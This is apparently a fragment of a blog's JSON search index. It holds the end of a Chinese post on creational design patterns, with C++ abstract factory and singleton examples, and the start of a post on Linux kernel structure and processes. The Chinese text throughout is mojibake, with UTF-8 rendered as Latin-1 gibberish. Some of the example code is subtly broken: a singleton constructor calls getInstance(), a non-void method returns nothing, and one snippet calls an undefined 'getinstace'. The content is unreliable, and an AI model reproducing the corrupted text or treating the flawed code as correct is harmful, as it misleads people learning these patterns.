system(&quot;pause&quot;); return 0;&#125; æŠ½è±¡å·¥å‚æ¨¡å¼ä¸ç¬¦åˆâ€œå¼€é—­åŸåˆ™â€ æŠ½è±¡å·¥å‚æ¨¡å¼çš„ä¼˜ç¼ºç‚¹ ä¼˜ç‚¹ï¼š æ‹¥æœ‰å·¥å‚æ–¹æ³•æ¨¡å¼çš„ä¼˜ç‚¹ å½“ä¸€ä¸ªäº§å“æ—ä¸­çš„å¤šä¸ªå¯¹è±¡è¢«è®¾è®¡æˆä¸€èµ·å·¥ä½œæ—¶ï¼Œå®ƒèƒ½å¤Ÿä¿è¯å®¢æˆ·ç«¯å§‹ç»ˆåªä½¿ç”¨åŒä¸€ä¸ªäº§å“æ—ä¸­çš„å¯¹è±¡ å¢åŠ æ–°çš„äº§å“æ—å¾ˆæ–¹ä¾¿ï¼Œæ— éœ€ä¿®æ”¹å·²æœ‰ç³»ç»Ÿï¼Œç¬¦åˆâ€œå¼€é—­åŸåˆ™â€ã€‚ ç¼ºç‚¹ï¼š å¢åŠ æ–°çš„äº§å“ç»“æ„éº»çƒ¦ï¼Œéœ€è¦å¯¹åŸæœ‰ç³»ç»Ÿè¿›è¡Œè¾ƒå¤§çš„ä¿®æ”¹ï¼Œç”šè‡³éœ€è¦ä¿®æ”¹æŠ½è±¡å±‚ä»£ç ï¼Œå¸¦æ¥è¾ƒå¤§çš„ä¸ä¾¿ï¼Œè¿èƒŒäº†â€œå¼€é—­åŸåˆ™â€ã€‚ æŠ½è±¡æ¨¡å¼çš„åº”ç”¨ï¼šå¯ä»¥è‡ªå·±å†™ä¸€ä¸ªè®¡ç®—æœºäº§å“ç›¸å…³ ç®€å•å·¥å‚æ¨¡å¼ + â€œå¼€é—­åŸåˆ™â€ = å·¥å‚æ–¹æ³•æ¨¡å¼ å·¥å‚æ–¹æ³•æ¨¡å¼ + â€œäº§å“æ—â€ = æŠ½è±¡å·¥å‚æ¨¡å¼ ç®€å•å·¥å‚æ¨¡å¼ï¼ˆè§„æ¨¡è¾ƒå°çš„æ¨¡å‹ï¼‰ å·¥å‚æ–¹æ³•æ¨¡å¼ï¼ˆä¸­ç­‰ï¼‰ æŠ½è±¡å·¥å‚æ¨¡å¼ï¼ˆå¤æ‚çš„ï¼‰ å€Ÿé‰´äº†ã€ŠEasyæå®šè®¾è®¡æ¨¡å¼ã€‹ ä¸‰ å•ä¾‹æ¨¡å¼ ä¿è¯ä¸€ä¸ªç±»ã€åªæœ‰ä¸€ä¸ªå®ä¾‹å­˜åœ¨ï¼ŒåŒæ—¶æä¾›èƒ½å¯¹è¯¥å®ä¾‹åŠ ä»¥è®¿é—®çš„çš„å…¨å±€è®¿é—®æ–¹æ³•ã€‚ ä¸‰ä¸ªè¦ç‚¹ï¼š ä¸€æ˜¯æŸä¸ªç±»åªèƒ½æœ‰ä¸€ä¸ªå®ä¾‹ï¼› äºŒæ˜¯å®ƒå¿…é¡»è‡ªè¡Œåˆ›å»ºè¿™ä¸ªå®ä¾‹ï¼› ä¸‰æ˜¯å®ƒå¿…é¡»è‡ªè¡Œå‘æ•´ä¸ªç³»ç»Ÿæä¾›è¿™ä¸ªå®ä¾‹ã€‚ è§’è‰²å’ŒèŒè´£ Singletonï¼ˆå•ä¾‹ï¼‰ï¼šåœ¨å•ä¾‹ç±»çš„å†…éƒ¨å®ç°åªç”Ÿæˆä¸€ä¸ªå®ä¾‹ï¼ŒåŒæ—¶æ˜¯ä»–æä¾›ä¸€ä¸ªé™æ€çš„getInstance()æ–¹æ³•ï¼Œè®©å®¢æˆ·å¯ä»¥è®¿é—®ä»–çš„å”¯ä¸€å®ä¾‹ï¼›ä¸ºäº†é˜²æ­¢åœ¨å¤–éƒ¨å¯¹å…¶å®ä¾‹åŒ–ï¼Œå°†å…¶æ„é€ å‡½æ•°è®¾è®¡ä¸ºç§æœ‰ï¼›åœ¨å•ä¾‹ç±»å†…éƒ¨å®šä¹‰äº†ä¸€ä¸ªSingletonç±»å‹çš„é™æ€å¯¹è±¡ï¼Œä½œä¸ºå¤–éƒ¨å…±äº«çš„å”¯ä¸€å®ä¾‹ã€‚ å•ä¾‹æ¨¡å¼çš„ä½¿ç”¨æ­¥éª¤ æ„é€ å‡½æ•°ç§æœ‰åŒ– æä¾›ä¸€ä¸ªå…¨å±€çš„é™æ€æ–¹æ³•ï¼ˆå…¨å±€è®¿é—®ç‚¹ï¼‰ æ¥è·å–å•ä¾‹å¯¹è±¡ã€‚ åœ¨ç±»ä¸­å®šä¹‰ä¸€ä¸ªé™æ€æŒ‡é’ˆï¼ŒæŒ‡å‘æœ¬ç±»çš„å˜é‡çš„é™æ€å˜é‡æŒ‡é’ˆ é¥¿æ±‰æ¨¡å¼ ç†è§£ ä¸»è¦å°±æ˜¯ä¸ºäº†åªè®©ç±»åªæœ‰ä¸€ä¸ªå®ä¾‹è€ŒæŠŠæ„é€ å‡½æ•°ç§æœ‰åŒ–ã€‚å®šä¹‰ä¸€ä¸ªå…¨å±€çš„é™æ€å®ä¾‹ã€‚ ä»£ç  123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;using namespace std;/*ä¸‰ä¸ªæ­¥éª¤ï¼š 1.æ„é€ å‡½æ•°ç§æœ‰åŒ–ï¼ˆä¸ºäº†ä¸è®©åœ¨ç±»çš„å¤–éƒ¨å†åˆ›å»ºå¤šä½™çš„å®ä¾‹ï¼‰ 2.æä¾›ä¸€ä¸ªå…¨å±€çš„é™æ€ç±»æŒ‡é’ˆæŒ‡å‘å”¯ä¸€å®ä¾‹ 3.æä¾›ä¸€ä¸ªå…¨å±€çš„é™æ€å‡½æ•°è·å–å®ä¾‹*/class Singleton &#123;public: // é™æ€ç±»å‡½æ•° è¿”å›é™æ€å®ä¾‹ static Singleton * getInstance() &#123; return instance; &#125;private: //ä¸è®©ç±»çš„å¤–éƒ¨åˆ›å»ºå®ä¾‹ Singleton() &#123; Singleton *single = getInstance(); &#125; Singleton getsingle() &#123; &#125; static Singleton * instance; //æŒ‡å‘æœ¬ç±»çš„å”¯ä¸€å®ä¾‹æŒ‡é’ˆ&#125;;//é™æ€ç±»å˜é‡åœ¨ç±»å¤–åˆå§‹åŒ–Singleton*Singleton::instance = new Singleton;int main()&#123; //é€šè¿‡getInstance()è·å–å®ä¾‹ Singleton * s1 = Singleton::getInstance(); system(&quot;pause&quot;); return 0;&#125; æ‡’æ±‰æ¨¡å¼ åœ¨ç¨‹åºæ‰§è¡ŒæœŸé—´å†å»åˆ¤æ–­æ˜¯å¦éœ€è¦å®ä¾‹ã€‚ 1234567891011121314151617181920class Singleton1 &#123;public: //æä¾›ä¸€ä¸ªè¿”å›å®ä¾‹çš„æ–¹æ³• static Singleton1 * getInstance() &#123; // ä¸ç¡®å®šç¨‹åºåœ¨ç¼–è¯‘æœŸé—´æ˜¯å¦éœ€è¦å®ä¾‹ // å¦‚æœæ˜¯å¤šçº¿ç¨‹ä¸‹ï¼Œéœ€è¦åœ¨è¿™é‡ŒåŠ é” if (instance1 == NULL) &#123; instance1 = new Singleton1; &#125; // é‡Šæ”¾é” cout &lt;&lt; &quot;Singleton1&quot; &lt;&lt; endl; return instance1; &#125;private: Singleton1() &#123; &#125; static Singleton1 *instance1;&#125;;//æ‡’æ±‰å¼çš„åˆå§‹åŒ–æ–¹å¼ é¥¿æ±‰å¼åœ¨åˆå§‹åŒ–æ—¶å·²ç»æŒ‡å‘äº†singletonSingleton1 * Singleton1::instance1 = NULL; é’ˆå¯¹å•ä¾‹æ¨¡å¼å»åˆ¤æ–­æ˜¯å¦æ˜¯åŒä¸€å®ä¾‹ 123456Singleton *s1 = Singleton::getinstace();Singleton *s2 = Singleton::getinstace();if (s1 == s2 ) cout &lt;&lt; &quot;s1 == s2&quot; &lt;&lt; endl;else cout &lt;&lt; &quot;s1 != s2&quot; &lt;&lt; endl; å•ä¾‹æ¨¡å¼çš„åº”ç”¨â€”â€”æ‰“å°æœº ç”¨å•ä¾‹æ¨¡å¼å®ç°ä¸€ä¸ªæ‰“å°æœºç¨‹åºï¼Œç”¨ä»¥è®°å½•æ‰“å°çš„æ¬¡æ•°å’Œå†…å®¹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;class Printer &#123;public: static Printer * getinstance() &#123; return instance; &#125; void print(string text) &#123; cout &lt;&lt; &quot;æ‰“å°çš„å†…å®¹ä¸ºï¼š&quot; &lt;&lt; text &lt;&lt; endl; sequence++; cout &lt;&lt; &quot;æ‰“å°æœºä»Šå¤©ä½¿ç”¨äº†&quot; &lt;&lt; sequence &lt;&lt; &quot;æ¬¡&quot; &lt;&lt; endl; &#125; static int getSequence() &#123; return sequence; &#125;private: // å®šä¹‰ä¸€ä¸ªç±»å»ææ„å•ä¾‹ class Garbo &#123; private: ~Garbo() &#123; if (instance != NULL) &#123; delete instance; &#125; &#125; &#125;; static Garbo garbo; // åœ¨é™æ€åŒºåŸŸå¼€è¾Ÿä¸€ä¸ªå¯¹è±¡ï¼ŒGarbo static int sequence; static Printer * instance;&#125;;int Printer::sequence = 0;Printer *Printer::instance = new Printer;Printer::Garbo Printer::garbo;int main()&#123; //ä¸‰ä¸ªpepleä½¿ç”¨æ‰“å°æœº Printer * p1 = Printer::getinstance(); p1-&gt;print(&quot;äº¿å°ç®€å†&quot;); Printer *p2 = Printer::getinstance(); p2-&gt;print(&quot;ä¸€ä»½å·¥ä½œæ±‡æŠ¥&quot;); Printer *p3 = Printer::getinstance(); p3-&gt;print(&quot;ç¦»èŒç”³è¯·&quot;); system(&quot;pause&quot;); return 0;&#125; ä»¥ä¸Šå°±æ˜¯å‡ ç§å¸¸è§çš„åˆ›å»ºå‹è®¾è®¡æ¨¡å¼ã€‚","tags":[{"name":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","permalink":"https://hodlyounger.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"è®¾è®¡æ¨¡å¼/åˆ›å»ºå‹æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼-åˆ›å»ºå‹æ¨¡å¼","permalink":"https://hodlyounger.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/"}],"categories":[{"name":"A_å†…åŠŸ","slug":"A-å†…åŠŸ","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"B_è®¾è®¡æ¨¡å¼","slug":"A-å†…åŠŸ/B-è®¾è®¡æ¨¡å¼","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/B-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}]},{"title":"ã€åŸç†å‰–æã€‘Linuxå†…æ ¸åŠè¿›ç¨‹æ¦‚è¿°","date":"2023-12-25T01:28:27.210Z","path":"A_OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ/ã€åŸç†å‰–æã€‘2-Linuxå†…æ ¸åŠè¿›ç¨‹ä»‹ç»/","text":"æ¦‚è¿°ï¼šæœ¬ç« çŸ¥è¯†ç‚¹ Linux å†…æ ¸ç»“æ„ Linux è¿›ç¨‹æ¦‚è¿° Linux ç³»ç»Ÿå¯¹è¿›ç¨‹çš„åˆ›å»ºã€åˆ‡æ¢ã€ç»“æŸæ“ä½œ 0x01 Linux å†…æ ¸æ¦‚è¿° äº‹å®ä¸Šï¼Œåœ¨ Linux æ“ä½œç³»ç»Ÿä¸­è®¾è®¡åˆ°çœŸæ­£çš„æ“ä½œç³»ç»Ÿçš„åŠŸèƒ½éƒ¨åˆ†å…¶å®éƒ½æ˜¯æ”¾åœ¨ Linux å†…æ ¸ä¸­çš„ã€‚Linux å†…æ ¸å…¶å®å°±æ˜¯ Linux æ“ä½œç³»ç»Ÿä¸­æœ€é‡è¦çš„éƒ¨åˆ†ã€‚Linux å†…æ ¸æ˜¯ç¡¬ä»¶å’Œè½¯ä»¶ä¹‹é—´çš„ä¸­é—´å±‚ï¼Œå°†åº”ç”¨ç¨‹åºçš„è¯·æ±‚ä¼ é€’ç»™ç¡¬ä»¶å¹¶å……å½“åº•å±‚é©±åŠ¨ç¨‹åºï¼Œå¯¹ç³»ç»Ÿä¸­çš„å„ä¸ªè®¾å¤‡å’Œç»„ä»¶è¿›è¡Œå¯»å€ç­‰ç­‰ä¸€äº›äº†åŠŸèƒ½ã€‚ ç›®å‰ï¼Œå¯¹äº Linux å†…æ ¸çš„ç ”ç©¶ä¸»è¦åˆ†ä¸ºä»¥ä¸‹ä¸‰éƒ¨åˆ†åŠŸèƒ½ï¼š å†…æ ¸çš„ç¡¬ä»¶è®¾å¤‡ç®¡ç†åŠŸèƒ½ï¼šä»åº”ç”¨ç¨‹åºçš„è§’åº¦æ¥è¯´ï¼Œå†…æ ¸å¯ä»¥è¢«è®¤ä¸ºæ˜¯ä¸€å°è¢«æŠ½è±¡çš„è®¡ç®—æœºã€‚å½“å†…æ ¸å¯»å€ç¡¬ç›˜ï¼Œå¿…é¡»ç¡®å®šä½¿ç”¨å“ªä¸ªè·¯å¾„èƒ½å¤Ÿä»ç¡¬ç›˜ä¸Šå°†æ•°æ®è¯»å–åˆ°å†…å­˜ä¸­ï¼Œè¿™å…¶ä¸­æ¶‰åŠåˆ°çš„æ•°æ®ä½ç½®ã€è·¯å¾„åŠè¯»å–æ•°æ®çš„æŒ‡ä»¤éƒ½æ˜¯ç”±å†…æ ¸å®Œæˆçš„ï¼Œè€Œå¯¹äºä¸Šå±‚åº”ç”¨ç¨‹åºä»…ä»…éœ€è¦è°ƒç”¨å†…æ ¸çš„ä¸€ä¸ªæ¥å£å‡½æ•°å³å¯å®Œæˆã€‚ä»æŸæ–¹é¢æ¥è¯´ï¼Œåº”ç”¨ç¨‹åºä¸ç¡¬ä»¶æœ¬èº«æ²¡æœ‰è”ç³»ï¼Œä»…ä»…ä¸å†…æ ¸æœ‰è”ç³»ï¼Œå†…æ ¸æ˜¯åº”ç”¨ç¨‹åºæ‰€çŸ¥é“çš„å±‚æ¬¡ç»“æ„ä¸­æœ€åº•ã€‚ å†…æ ¸çš„è¿›ç¨‹ç®¡ç†åŠŸèƒ½ï¼šå½“è‹¥å¹²åº”ç”¨ç¨‹åºåœ¨ç³»ç»Ÿä¸­åŒæ—¶è¿è¡Œæ—¶ï¼ŒLinux å†…æ ¸åˆéœ€è¦å……å½“èµ„æºç®¡ç†ç¨‹åºï¼Œå°†å¯ç”¨å…±äº«èµ„æºï¼ˆ CPU æ—¶é—´ã€ç£ç›˜ç©ºé—´ã€ç½‘ç»œè¿æ¥ç­‰ç­‰ï¼‰åˆç†åˆ†é…ç»™å„ä¸ªç³»ç»Ÿè¿›ç¨‹ä½¿ç”¨ï¼ŒåŒæ—¶è¿˜èƒ½ä¿è¯ç³»ç»Ÿçš„å®Œæ•´æ€§ã€‚ å†…æ ¸é¢å‘ç³»ç»Ÿæ¥å£åŠŸèƒ½ï¼šLinux å†…æ ¸ä¼šé¢å‘ç³»ç»Ÿæä¾›ä¸€ç³»åˆ—çš„æ¥å£å‡½æ•°ä¾›åº”ç”¨ç¨‹åºæ¥è°ƒç”¨ã€‚åº”ç”¨ç¨‹åºé€šè¿‡è°ƒç”¨ Linux å†…æ ¸çš„ä¸€ç³»åˆ—ç³»ç»Ÿæ¥å£èƒ½å¤Ÿä½¿å¾— Linux ç³»ç»Ÿå¸®åŠ©åº”ç”¨ç¨‹åºå®Œæˆä¸€ç³»åˆ—åŠŸèƒ½ã€‚ å¦å¤–ï¼Œä¸ºäº†æ›´ç®€å•ç†è§£ Linux æ“ä½œç³»ç»Ÿçš„åŠŸèƒ½åŸç†ï¼Œæˆ‘ä»¬é€‰æ‹©æ—©æœŸç‰ˆæœ¬çš„ Linux å†…æ ¸ä½œä¸ºä»£ç å‚è€ƒï¼Œè¿™æ ·å¯èƒ½æœ‰æ•ˆé¿å…å¾ˆå¤šä»£ç ç»“æ„ä¼˜åŒ–çš„ä»£ç å†…å®¹çš„å¹²æ‰°ã€‚ç›®å‰ä¸»æµç ”ç©¶ Linux å†…æ ¸çš„æ—©æœŸç‰ˆæœ¬éƒ½é€‰æ‹©çš„æ˜¯ Linux 0.12 ç‰ˆæœ¬ï¼Œå› ä¸ºè¿™ä¸€ç‰ˆæœ¬çš„æ•´ä½“ä»£ç é‡å¤§çº¦ä»…æœ‰ 2 ä¸‡è¡Œï¼Œå¹¶ä¸”åœ¨è¿™ä¸€ç‰ˆæœ¬ä¸­çš„ Linux å†…æ ¸çš„å¤§éƒ¨åˆ†ä¸»è¦åŠŸèƒ½å·²ç»éƒ½é½å…¨äº†ï¼ŒåæœŸçš„ Linux å†…æ ¸ä¸»è¦å®Œå–„å„ä¸ªåŠŸèƒ½åè°ƒã€ç¡¬ä»¶é€‚é…ã€å¹³å°é€‚é…ç­‰ç­‰æ–¹é¢ï¼ˆæœ€æ–°çš„ Linux 6.1 ç‰ˆæœ¬ä»£ç é‡å·²ç»çªç ´ 2700 ä¸‡è¡Œï¼‰ Linux å†…æ ¸å¯¹äºæ“ä½œç³»ç»Ÿæ¥è¯´å…¶å®æ˜¯å•å†…æ ¸æ¨¡å¼ï¼Œè¿™æ ·å¯¹äºæ“ä½œç³»ç»Ÿæ‰€æä¾›çš„æœåŠ¡æµç¨‹ä¸»è¦ä¸ºï¼šåº”ç”¨ä¸»ç¨‹åºä½¿ç”¨æŒ‡å®šçš„å‚æ•°å€¼æ‰§è¡Œç³»ç»Ÿè°ƒç”¨æŒ‡ä»¤ï¼ˆ int 0x80 )ï¼Œä½¿å¾— CPU ä»ç”¨æˆ·æ€åˆ‡æ¢åˆ°äº†å†…æ ¸æ€ï¼Œç„¶åæ“ä½œç³»ç»Ÿæ ¹æ®å…·ä½“çš„å‚æ•°å€¼è°ƒç”¨ç‰¹å®šçš„æœåŠ¡ç¨‹åºï¼Œè€Œè¿™äº›æœåŠ¡ç¨‹åºåœ¨å®Œæˆäº†å¯¹åº”çš„æ‰§è¡Œæ“ä½œåï¼Œæ“ä½œç³»ç»Ÿå†æ¬¡ä½¿å¾— CPU ä»å†…æ ¸æ€åˆ‡æ¢å›åˆ°ç”¨æˆ·æ€ï¼Œä»è€Œè¿”å›åˆ°åº”ç”¨ç¨‹åºä¸­ç»§ç»­æ‰§è¡Œã€‚å› æ­¤ï¼Œå¯ä»¥å°† Linux å†…æ ¸ç®€å•æ¦‚æ‹¬ä¸ºä¸‰ä¸ªå±‚æ¬¡ï¼šè°ƒç”¨æœåŠ¡ç¨‹åºçš„ä¸»ç¨‹åºå±‚ã€æ‰§è¡Œç³»ç»Ÿè°ƒç”¨çš„æœåŠ¡å±‚å’Œæ”¯æŒç³»ç»Ÿè°ƒç”¨çš„åº•å±‚å‡½æ•°ã€‚å…·ä½“å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 0x02 Linux å†…æ ¸ç»“æ„åŠä»»åŠ¡ç®¡ç†åŠŸèƒ½ Linux å†…æ ¸å…¶å®ä¸»è¦ç”± 5 ä¸ªæ¨¡å—æ„æˆï¼Œåˆ†åˆ«æ˜¯ï¼š è¿›ç¨‹è°ƒåº¦æ¨¡å— å†…å­˜ç®¡ç†æ¨¡å— æ–‡ä»¶ç³»ç»Ÿæ¨¡å— è¿›ç¨‹é—´é€šä¿¡æ¨¡å— ç½‘ç»œæ¥å£æ¨¡å— è¿™å‡ ä¸ªæ¨¡å—ä¹‹é—´çš„ä¾èµ–å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ç”±ä¸Šå›¾èƒ½å¤Ÿçœ‹å‡ºæ¥ï¼Œæ‰€æœ‰çš„æ¨¡å—éƒ½ä¸è¿›ç¨‹è°ƒåº¦æ¨¡å—å­˜åœ¨ä¾èµ–å…³ç³»ã€‚å› ä¸ºå®ƒä»¬éƒ½éœ€è¦ä¾é è¿›ç¨‹è°ƒåº¦æ¨¡å—å®Œæˆç¨‹åºçš„æŒ‚èµ·ï¼ˆæš‚åœï¼‰æˆ–è€…è¿›è¡Œè¿è¡Œçš„çŠ¶æ€ç®¡ç†ã€‚é€šå¸¸ï¼Œä¸€ä¸ªæ¨¡å—ä¼šåœ¨ç­‰å¾…ç¡¬ä»¶æ“ä½œæœŸé—´æŒ‚èµ·ï¼Œåœ¨æ“ä½œå®Œæˆè¿‡åç»§ç»­æ‰§è¡Œã€‚ ç»“åˆ Linux 0.12 å†…æ ¸æºä»£ç ï¼Œå¯ä»¥å°†å†…æ ¸ä¸­çš„ä¸»è¦æ¨¡å—ç»˜åˆ¶æˆå¦‚ä¸‹å›¾æ‰€ç¤ºçš„æ¡†å›¾ç»“æ„ï¼š 0x03 è¿›ç¨‹çš„å®šä¹‰ è¿›ç¨‹æ˜¯æ“ä½œç³»ç»Ÿä¸­æœ€åŸºæœ¬ã€æœ€é‡è¦çš„æ¦‚å¿µä¹‹ä¸€ã€‚è¿›ç¨‹çš„æ¦‚å¿µæœ€æ—©æ˜¯ 20 ä¸–çºª 60 å¹´ä»£åˆæœŸç”± MIT ï¼ˆç¾å›½éº»çœç†å·¥å­¦é™¢ï¼‰ç ”åˆ¶çš„ multics ç³»ç»Ÿå’Œ IBN çš„ TSS/360 ç³»ç»Ÿä¸­å‘½åçš„ã€‚ä»é‚£æ—¶å€™å¼€å§‹ï¼Œæ“ä½œç³»ç»Ÿä¸­æœ‰äº†è¿›ç¨‹çš„æ¦‚å¿µï¼š è¿›ç¨‹æ˜¯ç¨‹åºçš„ä¸€æ¬¡æ‰§è¡Œ è¿›ç¨‹æ˜¯å¯ä»¥å’Œå…¶ä»–è¿›ç¨‹å¹¶å‘æ‰§è¡Œçš„è®¡ç®— è¿›ç¨‹å°±æ˜¯ä¸€ä¸ªç¨‹åºåœ¨ç»™å®šæ´»åŠ¨ç©ºé—´å’Œåˆå§‹æ¡ä»¶ä¸‹ï¼Œåœ¨ä¸€ä¸ªå¤„ç†æœºä¸Šçš„æ‰§è¡Œè¿‡ç¨‹ è¿›ç¨‹æ˜¯ç¨‹åºåœ¨ä¸€ä¸ªæ•°æ®é›†åˆä¸Šçš„è¿è¡Œè¿‡ç¨‹ï¼Œæ˜¯ç³»ç»Ÿè¿›è¡Œèµ„æºåˆ†é…å’Œè°ƒåº¦çš„ä¸€ä¸ªç‹¬ç«‹å•ä½ è¿›ç¨‹æ˜¯åŠ¨æ€çš„ã€æœ‰ç”Ÿå‘½å‘¨æœŸçš„æ´»åŠ¨ã€‚å†…æ ¸å¯ä»¥åˆ›å»ºä¸€ä¸ªè¿›ç¨‹ï¼Œæœ€ç»ˆå°†ç”±å†…æ ¸ç»ˆæ­¢è¯¥è¿›ç¨‹ä½¿å…¶æ¶ˆäº¡ æˆ‘ä»¬çŸ¥é“ç¨‹åºæ˜¯ç”±ä»£ç ç»è¿‡ç¼–è¯‘å™¨ç¼–è¯‘ä¹‹åç§°ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œè€Œè¿›ç¨‹åˆ™æ˜¯ç”±ç¨‹åºæ–‡ä»¶æ‰§è¡Œè¿‡ç¨‹ä¸­å­˜åœ¨çš„ï¼Œå…·ä½“åŒºåˆ«å¦‚ä¸‹ï¼š ç¨‹åºæ˜¯ä»Šå¤©çš„æ¦‚å¿µï¼Œæ˜¯å¯ä»¥ä½œä¸ºä¸€ç§è½¯ä»¶èµ„æºé•¿æœŸä¿å­˜ï¼Œè€Œè¿›ç¨‹æ˜¯ç¨‹åºçš„ä¸€æ¬¡æ‰§è¡Œè¿‡ç¨‹ï¼Œæ˜¯åŠ¨æ€çš„æ¦‚å¿µ è¿›ç¨‹æ˜¯ä¸€ä¸ªèƒ½å¤Ÿç‹¬ç«‹è¿è¡Œçš„å•ä½ï¼Œèƒ½å¤Ÿä¸å…¶ä»–è¿›ç¨‹å¹¶å‘æ‰§è¡Œã€‚è¿›ç¨‹åœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­ä½œä¸ºèµ„æºç”³è¯·å’Œè°ƒåº¦çš„å•ä½å­˜åœ¨ï¼Œé€šå¸¸çš„ç¨‹åºæ˜¯ä¸èƒ½å¤Ÿä½œä¸ºç‹¬ç«‹è¿è¡Œçš„å•ä½è€Œå¹¶å‘æ‰§è¡Œçš„ã€‚ ç¨‹åºå’Œè¿›ç¨‹ä¸å­˜åœ¨ä¸€ä¸€å¯¹åº”çš„å…³ç³»ã€‚ä¸€ä¸ªç¨‹åºè¿è¡Œä¸€æ¬¡ä¾¿ä¼šåˆ›é€ ä¸€ä¸ªè¿›ç¨‹ï¼Œå¤šæ¬¡è¿è¡Œå°±ä¼šåˆ›é€ å¤šä¸ªè¿›ç¨‹ã€‚ å„ä¸ªè¿›ç¨‹åœ¨å¹¶å‘æ‰§è¡Œçš„è¿‡ç¨‹ä¸­äº§ç”Ÿç›¸äº’åˆ¶çº¦çš„å…³ç³»ï¼Œé€ æˆå„è‡ªè¿è¡Œçš„ä¸å¯é¢„æµ‹ï¼Œè€Œç¨‹åºæ˜¯é™æ€çš„ï¼Œä¸å­˜åœ¨è¿™ç§å¼‚æ­¥ç‰¹å¾ã€‚ 0x04 è¿›ç¨‹çš„ç‰¹å¾ ç›®å‰æ¦‚æ‹¬ï¼Œè¿›ç¨‹å…·æœ‰å¦‚ä¸‹ç‰¹å¾ï¼š åŠ¨æ€æ€§ï¼šè¿›ç¨‹æ˜¯è¿›ç¨‹å®ä½“çš„æ‰§è¡Œè¿‡ç¨‹ã€‚å› æ­¤ï¼ŒåŠ¨æ€æ€§æ˜¯è¿›ç¨‹æœ€åŸºæœ¬çš„ç‰¹æ€§ã€‚è¿›è¡Œç”±åˆ›å»ºè€Œäº§ç”Ÿï¼Œè°ƒåº¦è€Œæ‰§è¡Œï¼Œå› å¾—ä¸åˆ°èµ„æºè€ŒæŒ‚èµ·æ‰§è¡Œï¼Œå› ä¸ºæ’¤é”€è€Œæ¶ˆäº¡ï¼Œç”±æ­¤å¯è§ï¼Œè¿›ç¨‹æ˜¯æœ‰ä¸€å®šçš„ç”Ÿå‘½å‘¨æœŸçš„ã€‚ å¹¶å‘æ€§ï¼šè¿™æ˜¯æŒ‡å¤šä¸ªè¿›ç¨‹å®ä½“ï¼Œå…±å­˜äºå†…å­˜ä¸­å¹¶åœ¨ä¸€æ®µæ—¶é—´å†…åŒæ—¶æ‰§è¡Œã€‚å¹¶å‘æ€§æ˜¯è¿›ç¨‹çš„é‡è¦ç‰¹å¾ï¼ŒåŒæ—¶ä¹Ÿæ˜¯æ“ä½œç³»ç»Ÿçš„é‡è¦ç‰¹å¾ã€‚ ç‹¬ç«‹æ€§ï¼šè¿›ç¨‹æ˜¯ä¸€ä¸ªèƒ½å¤Ÿç‹¬ç«‹è¿è¡Œçš„åŸºæœ¬å•ä½ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ç³»ç»Ÿä¸­ç‹¬ç«‹è·å¾—èµ„æºå’Œè°ƒåº¦ç®¡ç†çš„åŸºæœ¬å•ä½ã€‚ å¼‚æ­¥æ€§ï¼šè¿›ç¨‹æŒ‰ç…§å„è‡ªç‹¬ç«‹çš„ã€ä¸å¯é¢„çŸ¥çš„é€Ÿåº¦å‘å‰è¿è¡Œï¼Œè¿™æ ·çš„è¯ï¼Œå¤šä¸ªè¿›ç¨‹åŒæ—¶è¿è¡Œæ—¶æ˜¯æŒ‰ç…§å¼‚æ­¥æ–¹å¼è¿è¡Œã€‚è¿™ä¸€ç‰¹å¾å¯¼è‡´ç¨‹åºæ‰§è¡Œçš„ä¸å¯é¢„æµ‹æ€§åŠä¸å¯å†ç°æ€§ã€‚å› æ­¤ï¼Œåœ¨æ“ä½œç³»ç»Ÿä¸­å¿…é¡»é‡‡å–æŸäº›æªæ–½æ¥ä¿è¯å„ä¸ªè¿›ç¨‹ä¹‹é—´èƒ½å¤Ÿåè°ƒè¿è¡Œã€‚ ç»“æ„ç‰¹å¾ï¼šä»ç»“æ„ä¸Šçœ‹ï¼Œè¿›ç¨‹å®ä½“æ˜¯ç”±ç¨‹åºæ®µã€æ•°æ®æ®µä»¥åŠè¿›ç¨‹æ§åˆ¶å—ç»„æˆï¼Œæ‰€ä»¥å¯ä»¥ç®€å•å°†è¿™ä¸‰éƒ¨åˆ†ç§°ä¸ºè¿›ç¨‹æ˜ åƒã€‚ 0x05 Linux è¿›ç¨‹æ§åˆ¶ å‰é¢å·²ç»è¯´æ˜äº†ç¨‹åºæ˜¯ä¸€ä¸ªå¯æ‰§è¡Œçš„æ–‡ä»¶ï¼Œè€Œè¿›ç¨‹æ‰æ˜¯ä¸€ä¸ªæ‰§è¡Œä¸­çš„ç¨‹åºå®ä¾‹ã€‚é€šè¿‡ CPU æ—¶é—´ç‰‡è½®è½¬çš„è°ƒåº¦æ–¹å¼ï¼Œåœ¨ Linux æ“ä½œç³»ç»Ÿä¸Šèƒ½å¤ŸåŒæ—¶è¿è¡Œå¤šä¸ªè¿›ç¨‹ã€‚ 